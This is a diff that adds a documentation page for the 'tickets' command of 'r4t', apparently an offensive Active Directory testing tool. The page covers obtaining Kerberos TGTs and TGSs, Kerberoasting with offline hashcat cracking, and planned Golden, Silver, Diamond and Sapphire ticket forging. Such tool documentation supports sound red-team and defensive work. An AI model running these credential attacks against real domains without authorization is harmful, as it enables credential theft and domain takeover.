@@ -1,0 +1,120 @@
+# tickets
+
+Kerberos ticket operations — obtaining TGTs and TGSs, and forging advanced ticket types (Silver, Golden, Diamond, Sapphire).
+
+---
+
+## Usage
+
+```
+r4t tickets <subcommand> [flags]
+```
+
+---
+
+## Subcommands
+
+### `tickets tgt`
+
+Obtain a Kerberos Ticket Granting Ticket (TGT) from a KDC (Domain Controller).
+
+```bash
+# Using stored credentials against stored target
+r4t tickets tgt
+
+# Specify a DC explicitly
+r4t tickets tgt dc01.corp.example.com
+
+# With inline credentials
+r4t tickets tgt -u jsmith -p 'P@ssword1' -d corp.example.com dc01.corp.example.com
+
+# With NT hash
+r4t tickets tgt -u jsmith --hash <ntlm-hash> -d corp.example.com dc01.corp.example.com
+
+# With AES key
+r4t tickets tgt --aes <aes-key> -u jsmith -d corp.example.com dc01.corp.example.com
+
+# With PFX certificate (PKINIT)
+r4t tickets tgt --pfx /tmp/user.pfx dc01.corp.example.com
+```
+
+All standard authentication methods are supported via the global flags: `--password`, `--hash`, `--aes`, `--pfx`, `--cert`/`--key`, `--ccache`.
+
+The resulting TGT is written to a `.ccache` file (path printed to stdout) and stored in the `tgts` table in SQLite.
+
+---
+
+### `tickets tgs`
+
+Obtain a Kerberos Ticket Granting Service ticket (TGS) for a specified SPN. Used for Kerberoasting.
+
+```bash
+# Get a TGS for a specific SPN
+r4t tickets tgs --spn "MSSQLSvc/sql.corp.example.com:1433" dc01.corp.example.com
+
+# HTTP service ticket
+r4t tickets tgs --spn "HTTP/app.corp.example.com" dc01.corp.example.com
+```
+
+| Flag | Description |
+|------|-------------|
+| `--spn` | Service Principal Name **[required]** |
+
+The resulting TGS is:
+- Written as a ccache file
+- Output in hashcat format (`$krb5tgs$23$...`) for offline cracking
+- Stored in the `tgss` table and hash in `kerberoast_hashes`
+
+```bash
+# Crack with hashcat
+hashcat -m 13100 kerberoast.hash wordlist.txt
+```
+
+---
+
+### `tickets silver` *(planned)*
+
+Craft a Silver Ticket — a forged TGS using a service account's NT hash or AES key. Silver Tickets allow authenticating to a specific service without touching the KDC.
+
+> Not yet implemented.
+
+---
+
+### `tickets golden` *(planned)*
+
+Craft a Golden Ticket — a forged TGT using the `krbtgt` account's NT hash or AES key. Golden Tickets allow authenticating as any user in the domain.
+
+> Not yet implemented.
+
+---
+
+### `tickets diamond` *(planned)*
+
+Craft a Diamond Ticket — a modified copy of a legitimate TGT, keeping the valid KDC signature while replacing PAC contents. Harder to detect than Golden Tickets.
+
+> Not yet implemented.
+
+---
+
+### `tickets sapphire` *(planned)*
+
+Craft a Sapphire Ticket — similar to Diamond but impersonates a specific high-privilege user by copying their PAC. Requires S4U2Self.
+
+> Not yet implemented.
+
+---
+
+## Ticket Storage
+
+| Table | Contents |
+|-------|----------|
+| `tgts` | Obtained TGTs (base64 ticket, expiry, target DC) |
+| `tgss` | Obtained TGSs (ticket, SPN, encryption type) |
+| `kerberoast_hashes` | TGS hashes in hashcat format for offline cracking |
+| `asrep_hashes` | AS-REP roastable hashes |
+
+---
+
+## Relationship to `krb`
+
+The `tickets` command and the [`krb`](./kerberos) command both provide TGT/TGS operations. They share the same underlying implementation — `tickets tgt` and `krb tgt` are equivalent entry points. The `tickets` command also adds the advanced ticket forging subcommands (silver/golden/diamond/sapphire).
